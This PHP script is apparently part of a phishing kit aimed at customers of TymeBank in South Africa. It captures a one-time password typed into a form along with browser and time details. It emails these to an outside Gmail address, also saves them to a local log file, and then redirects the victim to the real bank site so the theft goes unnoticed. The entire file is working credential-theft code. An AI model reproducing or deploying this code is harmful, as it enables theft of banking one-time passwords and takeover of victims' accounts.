<?php
session_start();
$login = $_SESSION['id'];
$otp = $_POST['otp'];
require_once('./geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "=============+ OTP 4 +=============\n";
$message .= "OTP: ".$_POST['otp']."\n";
$message .= "============= [ New Result Info ] =============\n";
$message .= 	"User-Agent: ".$browser."\n";
$message.= "Date Log  : ".$date."\n";
$message.= "Time Log  : ".$time."\n";


$domain = 'New Mail';
$subj = "Tyme EN: 2 | $otp";
$from = "From: $domain<west>\n";
mail("esctasy2400@gmail.com",$subj,$message,$from,$domain);
$fp = fopen("backupotp4resultsxxxxxxxxxxxxxxxxxxxxxxxxx.txt","a");
fputs($fp,$message);
fclose($fp);
header("Location: https://bank.tymedigital.co.za?login=$login&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1");
?>

<script language="JavaScript">
<!-- 
setTimeout ("changePage()", 1000);
function changePage() {
if (self.parent.frames.length != 0)
self.parent.location="https://bank.tymedigital.co.za";
}
// -->
</script>